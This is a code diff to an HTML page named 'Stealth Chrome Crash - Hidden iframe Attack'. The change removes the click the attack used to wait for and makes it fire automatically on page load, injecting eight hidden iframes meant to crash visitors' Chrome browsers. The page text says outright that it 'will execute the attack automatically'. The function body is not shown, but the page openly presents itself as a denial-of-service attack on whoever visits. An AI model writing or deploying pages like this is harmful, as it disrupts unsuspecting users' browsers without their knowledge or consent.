@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Stealth Chrome Crash</title>
+    <title>Stealth Chrome Crash - No Interaction</title>
 </head>
 <body>
     <h1>Stealth Chrome Crash - Hidden iframe Attack</h1>
-    <p>Click anywhere to start the attack.</p>
+    <p>This page will execute the attack automatically.</p>
 
     <script>
         function injectHiddenIframes(numFrames) {
@@ -42,10 +42,9 @@
             }
         }
 
-        // Require user interaction to bypass popup blocker
-        document.addEventListener("click", function() {
-            injectHiddenIframes(5); // Adjust number of hidden crash iframes
-        });
+        // Attack starts immediately on page load
+        injectHiddenIframes(8); // Adjust number of hidden crash iframes
     </script>
 </body>
 </html>
+
